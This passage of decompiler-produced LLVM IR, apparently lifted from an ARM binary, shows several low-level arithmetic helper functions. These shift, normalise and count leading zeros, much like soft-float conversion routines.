  %v1_1ed80 = load i32, i32* %r5.global-to-local, align 4
  %v4_1ed80 = udiv i32 %v1_1ed80, 2097152
  %v5_1ed80 = sub nsw i32 %v4_1ed80, %v3_1ed7c
  %v5_1ed84 = icmp ult i32 %v4_1ed80, %v3_1ed7c
  br i1 %v5_1ed84, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_1ed84 = sub nsw i32 0, %v5_1ed80
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_1ed84, %bb13 ], [ %v5_1ed80, %.thread3 ]
  %v0_1eda8 = phi i32 [ %v7_1ed84, %bb13 ], [ %v5_1ed80, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1ed88 = icmp ugt i32 %v4_1ed80, %v3_1ed7c
  br i1 %v7_1ed88, label %dec_label_pc_1ed8c, label %dec_label_pc_1eda8

dec_label_pc_1ed8c:                               ; preds = %bb14
  %v2_1ed8c = add nsw i32 %v0_1eda8, %v3_1ed7c
  store i32 %v2_1ed8c, i32* %r4.global-to-local, align 4
  %v0_1ed90 = load i32, i32* %r0.global-to-local, align 4
  %v1_1ed90 = load i32, i32* %r2.global-to-local, align 4
  %v0_1ed94 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ed94 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1ed90, i32* %r0.global-to-local, align 4
  store i32 %v1_1ed94, i32* %r1.global-to-local, align 4
  store i32 %v0_1ed90, i32* %r2.global-to-local, align 4
  store i32 %v0_1ed94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1eda8

dec_label_pc_1eda8:                               ; preds = %bb14, %dec_label_pc_1ed8c
  %tmp18 = icmp ugt i32 %v0_1eda8, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1eda8
  %v6_1edac = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1edac, i32* %r4.global-to-local, align 4
  store i32 %v6_1ed54, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1eda8, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_1ed54)
  %v0_1edb4 = load i32, i32* %r1.global-to-local, align 4
  %v3_1edb4 = icmp sgt i32 %v0_1edb4, -1
  %v4_1edc0 = urem i32 %v0_1edb4, 1048576
  %v5_1edc0 = or i32 %v4_1edc0, 1048576
  store i32 %v5_1edc0, i32* %r1.global-to-local, align 4
  br i1 %v3_1edb4, label %dec_label_pc_1edd0, label %dec_label_pc_1edc8

dec_label_pc_1edc8:                               ; preds = %bb16
  %v0_1edc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1edc8 = sub i32 0, %v0_1edc8
  store i32 %v1_1edc8, i32* %r0.global-to-local, align 4
  %v2_1edc8 = icmp eq i32 %v0_1edc8, 0
  %v2_1edcc = icmp eq i1 %v2_1edc8, false
  %v5_1edcc = sext i1 %v2_1edcc to i32
  %v6_1edcc = sub nsw i32 %v5_1edcc, %v5_1edc0
  store i32 %v6_1edcc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1edd0

dec_label_pc_1edd0:                               ; preds = %bb16, %dec_label_pc_1edc8
  %v0_1edd0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1edd0 = icmp sgt i32 %v0_1edd0, -1
  %v4_1edd8 = urem i32 %v0_1edd0, 1048576
  %v5_1edd8 = or i32 %v4_1edd8, 1048576
  store i32 %v5_1edd8, i32* %r3.global-to-local, align 4
  br i1 %v3_1edd0, label %dec_label_pc_1ede8, label %dec_label_pc_1ede0

dec_label_pc_1ede0:                               ; preds = %dec_label_pc_1edd0
  %v0_1ede0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ede0 = sub i32 0, %v0_1ede0
  store i32 %v1_1ede0, i32* %r2.global-to-local, align 4
  %v2_1ede0 = icmp eq i32 %v0_1ede0, 0
  %v2_1ede4 = icmp eq i1 %v2_1ede0, false
  %v5_1ede4 = sext i1 %v2_1ede4 to i32
  %v6_1ede4 = sub nsw i32 %v5_1ede4, %v5_1edd8
  store i32 %v6_1ede4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ede8

dec_label_pc_1ede8:                               ; preds = %dec_label_pc_1edd0, %dec_label_pc_1ede0
  %v0_1ede8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ede8 = load i32, i32* %r5.global-to-local, align 4
  %v4_1ede8 = icmp eq i32 %v1_1ede8, %v0_1ede8
  call void @__pseudo_cond_branch(i1 %v4_1ede8, i32 ptrtoint (i32* @global_var_1ef98.1280 to i32))
  %v1_1edec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1edec

; uselistorder directives
  uselistorder i32 %v0_1edd0, { 1, 0 }
  uselistorder i32 %v0_1edb4, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_1ed80, { 2, 1, 0 }
  uselistorder i32 %v3_1ed7c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1ed64, { 1, 0 }
  uselistorder i32 %v2_1ed5c, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1ed58, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_1ede8, { 1, 0 }
  uselistorder label %dec_label_pc_1edd0, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_1eda8, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1edf0() local_unnamed_addr {
dec_label_pc_1edf0:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1edf0 = load i32, i32* @r4, align 4
  %v1_1edf0 = add i32 %v0_1edf0, -1
  store i32 %v1_1edf0, i32* @r4, align 4
  %v0_1edf4 = load i32, i32* @r5, align 4
  %v1_1edf4 = sub i32 32, %v0_1edf4
  store i32 %v1_1edf4, i32* @lr, align 4
  %v5_1edf8 = icmp sgt i32 %v0_1edf4, 32
  br i1 %v5_1edf8, label %dec_label_pc_1ee14, label %dec_label_pc_1edfc

dec_label_pc_1edfc:                               ; preds = %dec_label_pc_1edf0
  %v0_1edfc = load i32, i32* @r2, align 4
  %v6_1edfc = shl i32 %v0_1edfc, %v1_1edf4
  store i32 %v6_1edfc, i32* %ip.global-to-local, align 4
  %v0_1ee00 = load i32, i32* @r0, align 4
  %v3_1ee00 = add i32 %v0_1edf4, -1
  %v4_1ee00 = shl i32 1, %v3_1ee00
  %v7_1ee00 = lshr i32 %v0_1edfc, %v0_1edf4
  %v8_1ee00 = add i32 %v0_1ee00, %v7_1ee00
  %v9_1ee00 = icmp ult i32 %v8_1ee00, %v0_1ee00
  %v0_1ee04 = load i32, i32* @r1, align 4
  %v2_1ee04 = zext i1 %v9_1ee00 to i32
  %v3_1ee04 = add i32 %v2_1ee04, %v0_1ee04
  %v1_1ee08 = load i32, i32* @r3, align 4
  %v7_1ee08 = shl i32 %v1_1ee08, %v1_1edf4
  %v8_1ee08 = add i32 %v7_1ee08, %v8_1ee00
  store i32 %v8_1ee08, i32* %r0.global-to-local, align 4
  %v5_1ee0c = and i32 %v1_1ee08, %v4_1ee00
  %v6_1ee0c = icmp ne i32 %v5_1ee0c, 0
  %v7_1ee0c = ashr i32 %v1_1ee08, %v0_1edf4
  %v9_1ee0c = add i32 %v3_1ee04, %v7_1ee0c
  %v10_1ee0c = zext i1 %v6_1ee0c to i32
  %v11_1ee0c = add i32 %v10_1ee0c, %v9_1ee0c
  br label %dec_label_pc_1ee30

dec_label_pc_1ee14:                               ; preds = %dec_label_pc_1edf0
  %v1_1ee14 = add i32 %v0_1edf4, -32
  %v1_1ee18 = add i32 %v1_1edf4, 32
  store i32 %v1_1ee18, i32* @lr, align 4
  %v0_1ee20 = load i32, i32* @r3, align 4
  %v2_1ee20 = add i32 %v1_1edf4, 31
  %v3_1ee20 = lshr i32 -2147483648, %v2_1ee20
  %v4_1ee20 = and i32 %v0_1ee20, %v3_1ee20
  %v5_1ee20 = icmp ne i32 %v4_1ee20, 0
  %v6_1ee20 = shl i32 %v0_1ee20, %v1_1ee18
  %v2_1ee24 = or i32 %v6_1ee20, 2
  %v2_1ee24.v6_1ee20 = select i1 %v5_1ee20, i32 %v2_1ee24, i32 %v6_1ee20
  store i32 %v2_1ee24.v6_1ee20, i32* %ip.global-to-local, align 4
  %v0_1ee28 = load i32, i32* @r0, align 4
  %v7_1ee28 = ashr i32 %v0_1ee20, %v1_1ee14
  %v8_1ee28 = add i32 %v0_1ee28, %v7_1ee28
  store i32 %v8_1ee28, i32* %r0.global-to-local, align 4
  %v0_1ee2c = load i32, i32* @r1, align 4
  %v2_1ee2c = and i32 %v0_1ee20, 1073741824
  %v3_1ee2c = icmp ne i32 %v2_1ee2c, 0
  %v4_1ee2c = ashr i32 %v0_1ee20, 31
  %v6_1ee2c = add i32 %v0_1ee2c, %v4_1ee2c
  %v7_1ee2c = zext i1 %v3_1ee2c to i32
  %v8_1ee2c = add i32 %v6_1ee2c, %v7_1ee2c
  br label %dec_label_pc_1ee30

dec_label_pc_1ee30:                               ; preds = %dec_label_pc_1edfc, %dec_label_pc_1ee14
  %storemerge = phi i32 [ %v11_1ee0c, %dec_label_pc_1edfc ], [ %v8_1ee2c, %dec_label_pc_1ee14 ]
  %v0_1ee30 = phi i32 [ %v11_1ee0c, %dec_label_pc_1edfc ], [ %v8_1ee2c, %dec_label_pc_1ee14 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_1ee30 = and i32 %v0_1ee30, -2147483648
  store i32 %v1_1ee30, i32* @r5, align 4
  %v1_1ee34 = icmp sgt i32 %v0_1ee30, -1
  call void @__pseudo_cond_branch(i1 %v1_1ee34, i32 ptrtoint (i32* @global_var_1ee44.1281 to i32))
  %v0_1ee38 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ee38 = sub i32 0, %v0_1ee38
  store i32 %v1_1ee38, i32* %ip.global-to-local, align 4
  %v2_1ee38 = icmp eq i32 %v0_1ee38, 0
  %v0_1ee3c = load i32, i32* %r0.global-to-local, align 4
  %v2_1ee3c = icmp eq i1 %v2_1ee38, false
  %v5_1ee3c = sext i1 %v2_1ee3c to i32
  %v6_1ee3c = sub i32 %v5_1ee3c, %v0_1ee3c
  store i32 %v6_1ee3c, i32* %r0.global-to-local, align 4
  %v7_1ee3c = zext i1 %v2_1ee3c to i32
  %v8_1ee3c = icmp ne i32 %v6_1ee3c, %v7_1ee3c
  %v9_1ee3c = icmp ne i32 %v0_1ee3c, -1
  %v10_1ee3c = or i1 %v9_1ee3c, %v8_1ee3c
  %v11_1ee3c = icmp ne i32 %v0_1ee3c, 0
  %v12_1ee3c = select i1 %v2_1ee3c, i1 %v10_1ee3c, i1 %v11_1ee3c
  %v0_1ee40 = load i32, i32* %r1.global-to-local, align 4
  %v5_1ee40 = sext i1 %v12_1ee3c to i32
  %v6_1ee40 = sub i32 %v5_1ee40, %v0_1ee40
  store i32 %v6_1ee40, i32* @r1, align 4
  ret i32 %v6_1ee3c

; uselistorder directives
  uselistorder i1 %v2_1ee3c, { 1, 2, 0 }
  uselistorder i32 %v0_1ee3c, { 1, 2, 0 }
  uselistorder i32 %v8_1ee2c, { 1, 0 }
  uselistorder i32 %v0_1ee20, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1ee0c, { 1, 0 }
  uselistorder i32 %v1_1ee08, { 1, 0, 2 }
  uselistorder i32 %v0_1ee00, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1ee30, { 1, 0 }
}

define i32 @function_1ee44(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1ee44:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1ee44 = load i32, i32* %r1.global-to-local, align 4
  %v3_1ee48 = icmp ult i32 %v0_1ee44, 1048574
  br i1 %v3_1ee48, label %dec_label_pc_1ee8c, label %dec_label_pc_1ee4c

dec_label_pc_1ee4c:                               ; preds = %dec_label_pc_1ee44
  %v3_1ee50 = icmp ult i32 %v0_1ee44, 2097150
  br i1 %v3_1ee50, label %dec_label_pc_1ee70, label %dec_label_pc_1ee54

dec_label_pc_1ee54:                               ; preds = %dec_label_pc_1ee4c
  %v1_1ee54 = urem i32 %v0_1ee44, 2
  %v2_1ee54 = icmp ne i32 %v1_1ee54, 0
  %v3_1ee54 = udiv i32 %v0_1ee44, 2
  store i32 %v3_1ee54, i32* %r1.global-to-local, align 4
  %v0_1ee58 = load i32, i32* %r0.global-to-local, align 4
  %v3_1ee58 = zext i1 %v2_1ee54 to i32
  %v6_1ee58 = zext i32 %v0_1ee58 to i64
  %v7_1ee58 = sub i32 33, %v0_1ee58
  %v8_1ee58 = zext i32 %v7_1ee58 to i64
  %v9_1ee58 = shl i64 %v6_1ee58, %v8_1ee58
  %v10_1ee58 = sub i32 32, %v0_1ee58
  %v11_1ee58 = shl i32 %v3_1ee58, %v10_1ee58
  %v12_1ee58 = zext i32 %v11_1ee58 to i64
  %v14_1ee58 = or i64 %v12_1ee58, %v9_1ee58
  %v15_1ee58 = trunc i64 %v14_1ee58 to i32
  %v16_1ee58 = add i32 %v0_1ee58, -1
  %v17_1ee58 = shl i32 1, %v16_1ee58
  %v18_1ee58 = and i32 %v17_1ee58, %v0_1ee58
  %v19_1ee58 = icmp ne i32 %v18_1ee58, 0
  store i32 %v15_1ee58, i32* %r0.global-to-local, align 4
  %v0_1ee5c = load i32, i32* @ip, align 4
  %v3_1ee5c = zext i1 %v19_1ee58 to i32
  %v6_1ee5c = zext i32 %v0_1ee5c to i64
  %v7_1ee5c = sub i32 33, %v0_1ee5c
  %v8_1ee5c = zext i32 %v7_1ee5c to i64
  %v9_1ee5c = shl i64 %v6_1ee5c, %v8_1ee5c
  %v10_1ee5c = sub i32 32, %v0_1ee5c
  %v11_1ee5c = shl i32 %v3_1ee5c, %v10_1ee5c
  %v12_1ee5c = zext i32 %v11_1ee5c to i64
  %v14_1ee5c = or i64 %v12_1ee5c, %v9_1ee5c
  %v15_1ee5c = trunc i64 %v14_1ee5c to i32
  store i32 %v15_1ee5c, i32* @ip, align 4
  %v0_1ee60 = load i32, i32* @r4, align 4
  %v1_1ee60 = add i32 %v0_1ee60, 1
  store i32 %v1_1ee60, i32* @r4, align 4
  %v3_1ee64 = mul i32 %v1_1ee60, 2097152
  %v2_1ee68 = icmp ugt i32 %v3_1ee64, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1ee68, i32 ptrtoint (i32* @global_var_1f020.1282 to i32))
  br label %dec_label_pc_1ee70

dec_label_pc_1ee70:                               ; preds = %dec_label_pc_1ee8c, %dec_label_pc_1ee4c, %dec_label_pc_1ee54
  %v0_1ee70 = load i32, i32* @ip, align 4
  %v2_1ee70 = icmp slt i32 %v0_1ee70, 0
  %v6_1ee70 = icmp eq i32 %v0_1ee70, -2147483648
  %v1_1ee74 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1ee70, label %bb, label %dec_label_pc_1ee70._crit_edge

bb:                                               ; preds = %dec_label_pc_1ee70
  %v2_1ee74 = urem i32 %v1_1ee74, 2
  %v3_1ee74 = icmp ne i32 %v2_1ee74, 0
  br label %dec_label_pc_1ee70._crit_edge

dec_label_pc_1ee70._crit_edge:                    ; preds = %dec_label_pc_1ee70, %bb
  %v1_1ee78 = phi i1 [ %v3_1ee74, %bb ], [ %v2_1ee70, %dec_label_pc_1ee70 ]
  %v2_1ee78 = zext i1 %v1_1ee78 to i32
  %v3_1ee78 = add i32 %v2_1ee78, %v1_1ee74
  store i32 %v3_1ee78, i32* %r0.global-to-local, align 4
  %v0_1ee7c = load i32, i32* %r1.global-to-local, align 4
  %v1_1ee7c = load i32, i32* @r4, align 4
  %v2_1ee7c = and i32 %v1_1ee7c, 4096
  %v3_1ee7c = icmp ne i32 %v2_1ee7c, 0
  %v4_1ee7c = mul i32 %v1_1ee7c, 1048576
  %v6_1ee7c = add i32 %v4_1ee7c, %v0_1ee7c
  %v7_1ee7c = zext i1 %v3_1ee7c to i32
  %v8_1ee7c = add i32 %v7_1ee7c, %v6_1ee7c
  %v1_1ee80 = load i32, i32* @r5, align 4
  %v2_1ee80 = or i32 %v1_1ee80, %v8_1ee7c
  store i32 %v2_1ee80, i32* %r1.global-to-local, align 4
  ret i32 %v3_1ee78

dec_label_pc_1ee8c:                               ; preds = %dec_label_pc_1ee44
  %v0_1ee8c = load i32, i32* @ip, align 4
  %v1_1ee8c = icmp slt i32 %v0_1ee8c, 0
  %v2_1ee8c = mul i32 %v0_1ee8c, 2
  store i32 %v2_1ee8c, i32* @ip, align 4
  %v0_1ee90 = load i32, i32* %r0.global-to-local, align 4
  %v3_1ee90 = mul i32 %v0_1ee90, 2
  %v4_1ee90 = zext i1 %v1_1ee8c to i32
  %v5_1ee90 = or i32 %v3_1ee90, %v4_1ee90
  store i32 %v5_1ee90, i32* %r0.global-to-local, align 4
  %v9_1ee90 = icmp ule i32 %v5_1ee90, %v0_1ee90
  %v10_1ee90 = icmp ult i32 %v3_1ee90, %v0_1ee90
  %v11_1ee90 = select i1 %v1_1ee8c, i1 %v9_1ee90, i1 %v10_1ee90
  %v3_1ee94 = mul i32 %v0_1ee44, 2
  %v4_1ee94 = zext i1 %v11_1ee90 to i32
  %v5_1ee94 = or i32 %v4_1ee94, %v3_1ee94
  store i32 %v5_1ee94, i32* %r1.global-to-local, align 4
  %v1_1ee98 = and i32 %v3_1ee94, 1048576
  %v2_1ee98 = icmp eq i32 %v1_1ee98, 0
  %v0_1ee9c = load i32, i32* @r4, align 4
  %v1_1ee9c = add i32 %v0_1ee9c, -1
  store i32 %v1_1ee9c, i32* @r4, align 4
  br i1 %v2_1ee98, label %bb7, label %dec_label_pc_1ee70

bb7:                                              ; preds = %dec_label_pc_1ee8c
  ret i32 %v5_1ee90

; uselistorder directives
  uselistorder i32 %v0_1ee90, { 1, 2, 0 }
  uselistorder i1 %v1_1ee8c, { 1, 0 }
  uselistorder i32 %v1_1ee74, { 1, 0 }
  uselistorder i32 %v0_1ee70, { 1, 0 }
  uselistorder i32 %v0_1ee5c, { 1, 0, 2 }
  uselistorder i32 %v0_1ee58, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1ee70._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1ee70, { 0, 2, 1 }
}

define i32 @function_1eea4() local_unnamed_addr {
dec_label_pc_1eea4:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_1eea4 = load i32, i32* @r1, align 4
  %v2_1eea4 = icmp eq i32 %v0_1eea4, 0
  br i1 %v2_1eea4, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_1eea4
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_1eea4
  %v1_1eeb010 = load i32, i32* @r0, align 4
  store i32 %v1_1eeb010, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_1ef0c = phi i32 [ %v0_1eea4, %bb ], [ %v1_1eeb010, %bb38 ]
  %v1_1eec4 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_1eebc = icmp ugt i32 %v0_1ef0c, 65535
  br i1 %v2_1eebc, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_1eec0 = and i32 %v0_1ef0c, 32768
  %v3_1eec0 = icmp eq i32 %v2_1eec0, 0
  %v4_1eec0 = udiv i32 %v0_1ef0c, 65536
  br i1 %v3_1eec0, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_1eec4 = add nsw i32 %v1_1eec4, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_1eed0 = phi i32 [ %v1_1eec4, %.thread ], [ %v1_1eec4, %bb39 ], [ %v2_1eec4, %bb40 ]
  %v1_1eecc = phi i32 [ %v0_1ef0c, %.thread ], [ %v4_1eec0, %bb39 ], [ %v4_1eec0, %bb40 ]
  %v2_1eec8 = icmp ugt i32 %v1_1eecc, 255
  br i1 %v2_1eec8, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_1eecc = and i32 %v1_1eecc, 128
  %v3_1eecc = icmp eq i32 %v2_1eecc, 0
  %v4_1eecc = udiv i32 %v1_1eecc, 256
  br i1 %v3_1eecc, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_1eed0 = add nsw i32 %v1_1eed0, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_1eedc = phi i32 [ %v1_1eed0, %.thread3 ], [ %v1_1eed0, %bb41 ], [ %v2_1eed0, %bb42 ]
  %v1_1eed8 = phi i32 [ %v1_1eecc, %.thread3 ], [ %v4_1eecc, %bb41 ], [ %v4_1eecc, %bb42 ]
  %v2_1eed4 = icmp ugt i32 %v1_1eed8, 15
  br i1 %v2_1eed4, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_1eed8 = and i32 %v1_1eed8, 8
  %v3_1eed8 = icmp eq i32 %v2_1eed8, 0
  %v4_1eed8 = udiv i32 %v1_1eed8, 16
  br i1 %v3_1eed8, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_1eedc = add nsw i32 %v1_1eedc, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_1eee4 = phi i32 [ %v1_1eedc, %.thread4 ], [ %v1_1eedc, %bb43 ], [ %v2_1eedc, %bb44 ]
  %v1_1eeec = phi i32 [ %v1_1eed8, %.thread4 ], [ %v4_1eed8, %bb43 ], [ %v4_1eed8, %bb44 ]
  %v2_1eee0 = icmp ugt i32 %v1_1eeec, 3
  br i1 %v2_1eee0, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_1eee4 = add i32 %v1_1eee4, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_1eee8 = udiv i32 %v1_1eeec, 2
  %v6_1eee8 = sub i32 %v1_1eee4, %v5_1eee8
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_1eeec = phi i32 [ %v6_1eee8, %.thread6 ], [ %v2_1eee4, %bb45 ]
  %v4_1eeec = udiv i32 %v1_1eeec, 8
  %v5_1eeec = sub i32 %v0_1eeec, %v4_1eeec
  %v2_1eef0 = add i32 %v5_1eeec, -32
  %v4_1eef0 = sub i32 31, %v5_1eeec
  %v5_1eef0 = and i32 %v4_1eef0, %v5_1eeec
  %v8_1eef0 = icmp eq i32 %v5_1eeec, 32
  %v6_1eef4 = icmp slt i32 %v5_1eeec, 32
  br i1 %v6_1eef4, label %dec_label_pc_1eef8, label %dec_label_pc_1ef18

dec_label_pc_1eef8:                               ; preds = %bb46
  %v2_1eef8 = add i32 %v5_1eeec, -20
  %v7_1eefc = icmp sgt i32 %v2_1eef0, -12
  br i1 %v7_1eefc, label %dec_label_pc_1ef00, label %dec_label_pc_1ef14

dec_label_pc_1ef00:                               ; preds = %dec_label_pc_1eef8
  %v1_1ef04 = sub i32 32, %v5_1eeec
  %v6_1ef08 = shl i32 %v0_1ef0c, %v5_1eeec
  store i32 %v6_1ef08, i32* @r0, align 4
  %v6_1ef0c = lshr i32 %v0_1ef0c, %v1_1ef04
  store i32 %v6_1ef0c, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_1ef14:                               ; preds = %dec_label_pc_1eef8
  %v8_1eef8 = icmp eq i32 %v2_1eef8, 0
  %v4_1eef8 = add i32 %v5_1eeec, 2147483616
  %v5_1eef8 = and i32 %v2_1eef8, %v4_1eef8
  br label %dec_label_pc_1ef18

dec_label_pc_1ef18:                               ; preds = %bb46, %dec_label_pc_1ef14
  %v1_1ef24.in = phi i32 [ %v2_1eef0, %bb46 ], [ %v2_1eef8, %dec_label_pc_1ef14 ]
  %v6_1ef24 = phi i32 [ %v2_1eef0, %bb46 ], [ %v5_1eeec, %dec_label_pc_1ef14 ]
  %v2_1ef24.in = phi i32 [ %v5_1eef0, %bb46 ], [ %v5_1eef8, %dec_label_pc_1ef14 ]
  %v0_1ef24 = phi i1 [ %v8_1eef0, %bb46 ], [ %v8_1eef8, %dec_label_pc_1ef14 ]
  %v1_1ef24 = icmp slt i32 %v1_1ef24.in, 0
  %v2_1ef24 = icmp slt i32 %v2_1ef24.in, 0
  %v3_1ef18 = xor i1 %v2_1ef24, %v1_1ef24
  %v4_1ef18 = or i1 %v0_1ef24, %v3_1ef18
  br i1 %v4_1ef18, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_1ef18
  %v6_1ef18 = sub i32 32, %v6_1ef24
  store i32 %v6_1ef18, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1ef18, %bb47
  %v6_1ef1c = shl i32 %v0_1ef0c, %v6_1ef24
  store i32 %v6_1ef1c, i32* %r1.global-to-local, align 4
  br i1 %v4_1ef18, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_1ef20 = load i32, i32* @r0, align 4
  %v7_1ef20 = load i32, i32* @ip, align 4
  %v12_1ef20 = lshr i32 %v6_1ef20, %v7_1ef20
  %v13_1ef20 = or i32 %v12_1ef20, %v6_1ef1c
  store i32 %v13_1ef20, i32* %r1.global-to-local, align 4
  %v11_1ef24 = shl i32 %v6_1ef20, %v6_1ef24
  store i32 %v11_1ef24, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_1ef00, %bb49
  %v6_1ef2c = phi i32 [ %v6_1ef0c, %dec_label_pc_1ef00 ], [ %v13_1ef20, %bb49 ], [ %v6_1ef1c, %bb48 ]
  %v0_1ef28 = load i32, i32* @r4, align 4
  %v2_1ef28 = sub i32 %v0_1ef28, %v5_1eeec
  store i32 %v2_1ef28, i32* %r4.global-to-local, align 4
  %v4_1ef28 = xor i32 %v0_1ef28, %v5_1eeec
  %v5_1ef28 = xor i32 %v2_1ef28, %v0_1ef28
  %v6_1ef28 = and i32 %v5_1ef28, %v4_1ef28
  %v7_1ef28 = icmp slt i32 %v6_1ef28, 0
  %v8_1ef28 = icmp slt i32 %v2_1ef28, 0
  %v5_1ef2c = icmp slt i32 %v0_1ef28, %v5_1eeec
  br i1 %v5_1ef2c, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_1ef2c = mul i32 %v2_1ef28, 1048576
  %v11_1ef2c = add i32 %v10_1ef2c, %v6_1ef2c
  %v7_1ef30 = load i32, i32* @r5, align 4
  %v8_1ef30 = or i32 %v7_1ef30, %v11_1ef2c
  store i32 %v8_1ef30, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_1ef38 = xor i1 %v8_1ef28, %v7_1ef28
  %v4_1ef38 = xor i1 %v3_1ef38, true
  call void @__pseudo_cond_branch(i1 %v4_1ef38, i32 %tmp33)
  %v0_1ef3c = load i32, i32* %r4.global-to-local, align 4
  %v2_1ef40 = sub i32 -32, %v0_1ef3c
  store i32 %v2_1ef40, i32* %r4.global-to-local, align 4
  %v6_1ef44 = icmp sgt i32 %v0_1ef3c, -32
  br i1 %v6_1ef44, label %dec_label_pc_1ef48, label %dec_label_pc_1ef88

dec_label_pc_1ef48:                               ; preds = %.thread8
  %v1_1ef48 = add i32 %v2_1ef40, 12
  store i32 %v1_1ef48, i32* %r4.global-to-local, align 4
  %v8_1ef4c = icmp sgt i32 %v1_1ef48, 0
  br i1 %v8_1ef4c, label %dec_label_pc_1ef6c, label %dec_label_pc_1ef50

dec_label_pc_1ef50:                               ; preds = %dec_label_pc_1ef48
  %v1_1ef50 = add i32 %v2_1ef40, 32
  %v1_1ef54 = sub i32 0, %v2_1ef40
  %v0_1ef58 = load i32, i32* @r0, align 4
  %v6_1ef58 = lshr i32 %v0_1ef58, %v1_1ef50
  %v1_1ef5c = load i32, i32* %r1.global-to-local, align 4
  %v7_1ef5c = shl i32 %v1_1ef5c, %v1_1ef54
  %v8_1ef5c = or i32 %v7_1ef5c, %v6_1ef58
  %v0_1ef60 = load i32, i32* @r5, align 4
  %v7_1ef60 = lshr i32 %v1_1ef5c, %v1_1ef50
  %v8_1ef60 = or i32 %v0_1ef60, %v7_1ef60
  store i32 %v8_1ef60, i32* %r1.global-to-local, align 4
  %v2_1ef64 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1ef64, i32* %r4.global-to-local, align 4
